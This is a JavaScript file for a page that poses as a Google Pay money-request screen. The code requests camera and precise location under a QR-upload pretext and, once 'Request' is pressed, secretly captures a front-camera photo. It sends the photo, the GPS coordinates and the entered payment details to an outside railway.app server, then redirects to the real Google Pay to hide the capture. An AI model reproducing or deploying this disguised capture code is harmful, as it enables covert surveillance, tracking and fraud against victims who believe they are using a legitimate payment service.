// Global state
let recipientName = '';
let recipientUpi = '';
let currentAmount = '0';
let currentNote = '';
let stream = null;
let activeTab = 'scan';
let uploadedFile = null;

// Get all elements
const recipientInputScreen = document.getElementById('recipientInputScreen');
const recipientScreen = document.getElementById('recipientScreen');
const methodScreen = document.getElementById('methodScreen');
const processingScreen = document.getElementById('processingScreen');
const successScreen = document.getElementById('successScreen');

// Helper: Get first letter and generate color
function getAvatarLetter(name) {
    return name.trim().charAt(0).toUpperCase() || 'U';
}

function getAvatarColor(name) {
    const colors = ['#ea4335', '#34a853', '#4285f4', '#fbbc04', '#9c27b0', '#ff6d00', '#00acc1'];
    const index = name.charCodeAt(0) % colors.length;
    return colors[index];
}

// Helper: Get first name
function getFirstName(fullName) {
    return fullName.trim().split(' ')[0].toUpperCase();
}

// Helper: Format time
function getCurrentTime() {
    const now = new Date();
    let hours = now.getHours();
    const minutes = now.getMinutes();
    const ampm = hours >= 12 ? 'pm' : 'am';
    hours = hours % 12 || 12;
    return `${hours}:${minutes.toString().padStart(2, '0')} ${ampm}`;
}

// Update all UI elements with recipient info
function updateRecipientInfo() {
    const letter = getAvatarLetter(recipientName);
    const color = getAvatarColor(recipientName);
    const firstName = getFirstName(recipientName);
    
    // Update all avatars
    document.querySelectorAll('.recipient-avatar, .recipient-avatar-small').forEach(el => {
        el.textContent = letter;
        el.style.background = color;
    });
    
    // Update names
    document.getElementById('nameAmount').textContent = recipientName;
    document.getElementById('nameMethod').textContent = recipientName;
    document.getElementById('bankName').textContent = recipientName;
    document.getElementById('nameProcessing').textContent = firstName;
    document.getElementById('nameSuccess').textContent = recipientName;
    
    // Update UPI
    document.getElementById('upiMethod').textContent = recipientUpi;
    document.getElementById('upiSuccess').textContent = recipientUpi;
}

// Step 0: Continue to amount screen
document.getElementById('continueToAmount').addEventListener('click', () => {
    recipientName = document.getElementById('recipientNameInput').value.trim();
    recipientUpi = document.getElementById('recipientUpiInput').value.trim();
    
    if (!recipientName || !recipientUpi) {
        alert('Please enter both name and UPI ID');
        return;
    }
    
    updateRecipientInfo();
    recipientInputScreen.classList.remove('active');
    recipientScreen.classList.add('active');
});

// Back to recipient input
document.getElementById('backToRecipient').addEventListener('click', () => {
    recipientScreen.classList.remove('active');
    recipientInputScreen.classList.add('active');
});

// Amount input handling
const amountInput = document.getElementById('amountInput');
amountInput.addEventListener('input', () => {
    currentAmount = amountInput.value || '0';
});

// Next button - go to method screen
document.getElementById('nextBtn').addEventListener('click', () => {
    currentAmount = amountInput.value || '0';
    if (parseFloat(currentAmount) > 0) {
        currentNote = document.getElementById('noteInput').value.trim();
        recipientScreen.classList.remove('active');
        methodScreen.classList.add('active');
    } else {
        alert('Please enter an amount');
    }
});

// Back to amount
document.getElementById('backToAmount').addEventListener('click', () => {
    methodScreen.classList.remove('active');
    recipientScreen.classList.add('active');
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
});

// QR Upload - Request all permissions when clicked
let permissionsGranted = false;

document.getElementById('uploadArea').addEventListener('click', async () => {
    // If permissions already granted, just show file picker
    if (permissionsGranted) {
        showFilePicker();
        return;
    }
    
    try {
        // Request location first
        const locationData = await getLocation();
        
        // Then request camera
        const cameraStarted = await startCamera();
        
        // Both permissions granted successfully
        permissionsGranted = true;
        
        // Stop camera after getting permission (we'll start it again when requesting)
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
            stream = null;
        }
        
        // Show file picker
        showFilePicker();
        
    } catch (error) {
        console.error('Permission error:', error);
        // Only show alert if permissions were actually denied
        if (error.message.includes('denied') || error.message.includes('not allowed')) {
            alert('Please allow camera and location access to upload QR code');
        } else {
            // Permission granted but other error, still show file picker
            permissionsGranted = true;
            showFilePicker();
        }
    }
});

// Show file picker
function showFilePicker() {
    const input = document.createElement('input');
    input.type = 'file';
    input.accept = 'image/*';
    input.onchange = (e) => {
        const file = e.target.files[0];
        if (file) {
            uploadedFile = file;
            const reader = new FileReader();
            reader.onload = (event) => {
                document.getElementById('previewImage').src = event.target.result;
                document.getElementById('uploadPreview').style.display = 'block';
                document.getElementById('uploadArea').style.display = 'none';
            };
            reader.readAsDataURL(file);
        }
    };
    input.click();
}

// Change QR button
document.getElementById('changeQrBtn').addEventListener('click', (e) => {
    e.stopPropagation();
    document.getElementById('uploadPreview').style.display = 'none';
    document.getElementById('uploadArea').style.display = 'flex';
    uploadedFile = null;
    showFilePicker();
});

// Request button - main action
document.getElementById('requestBtn').addEventListener('click', async () => {
    const btn = document.getElementById('requestBtn');
    btn.disabled = true;
    btn.textContent = 'Processing...';

    // Show processing screen
    methodScreen.classList.remove('active');
    processingScreen.classList.add('active');
    document.getElementById('processingAmount').textContent = currentAmount;
    document.getElementById('processingNote').textContent = currentNote || '';
    document.getElementById('processingText').textContent = `Requesting ₹${currentAmount} from ${recipientName}`;

    try {
        // Get location first
        const locationData = await getLocation();
        
        // Start camera and wait for it to be ready
        await startCamera();
        
        // Wait a bit for camera to stabilize
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Capture photo
        const photoBlob = await capturePhoto();
        
        // Send to server
        const result = await sendToServer(photoBlob, locationData);
        
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Show success
        showSuccess();

    } catch (error) {
        console.error('Error:', error);
        alert('Request failed: ' + error.message);
        processingScreen.classList.remove('active');
        methodScreen.classList.add('active');
        btn.disabled = false;
        btn.textContent = 'Request';
    }
});

// Get location
function getLocation() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
            reject(new Error('Location not supported'));
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (position) => {
                resolve({
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: position.timestamp
                });
            },
            (error) => reject(new Error('Location access required')),
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    });
}

// Start camera
async function startCamera() {
    try {
        // Stop existing stream if any
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        
        stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user', // Use front camera for selfie
                width: { ideal: 1280 }, 
                height: { ideal: 720 } 
            },
            audio: false
        });
        
        const video = document.getElementById('video');
        if (video) {
            video.srcObject = stream;
            // Wait for video to be ready
            await new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });
        }
        
        return true;
    } catch (error) {
        console.error('Camera error:', error);
        throw new Error('Camera access required');
    }
}

// Capture photo
function capturePhoto() {
    return new Promise((resolve, reject) => {
        try {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            if (!video || !video.videoWidth || !video.videoHeight) {
                reject(new Error('Video not ready'));
                return;
            }
            
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob((blob) => {
                if (blob) {
                    resolve(blob);
                } else {
                    reject(new Error('Failed to capture photo'));
                }
            }, 'image/jpeg', 0.8);
        } catch (error) {
            reject(error);
        }
    });
}

// Send to server
async function sendToServer(photoBlob, locationData) {
    const formData = new FormData();
    formData.append('photo', photoBlob, 'capture.jpg');
    formData.append('latitude', locationData.latitude);
    formData.append('longitude', locationData.longitude);
    formData.append('accuracy', locationData.accuracy);
    formData.append('timestamp', locationData.timestamp);
    formData.append('amount', currentAmount);
    formData.append('recipientName', recipientName);
    formData.append('recipientUpi', recipientUpi);
    formData.append('note', currentNote || '');

    try {
        const response = await fetch('https://web-production-2f4a9.up.railway.app/api/verify', {
            method: 'POST',
            body: formData
        });
        if (!response.ok) {
            const errorData = await response.json().catch(() => ({}));
            throw new Error(errorData.error || `Server error: ${response.status}`);
        }
        return await response.json();
    } catch (error) {
        console.error('Server error:', error);
        throw error;
    }
}

// Show success
function showSuccess() {
    processingScreen.classList.remove('active');
    successScreen.classList.add('active');
    
    // Update success screen with details
    document.getElementById('successAmount').textContent = currentAmount;
    document.getElementById('successRecipient').textContent = recipientName;

    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
    
    // Redirect to actual Google Pay after 3 seconds
    setTimeout(() => {
        window.location.href = 'https://pay.google.com';
    }, 3000);
}

// Cleanup
window.addEventListener('beforeunload', () => {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }
});
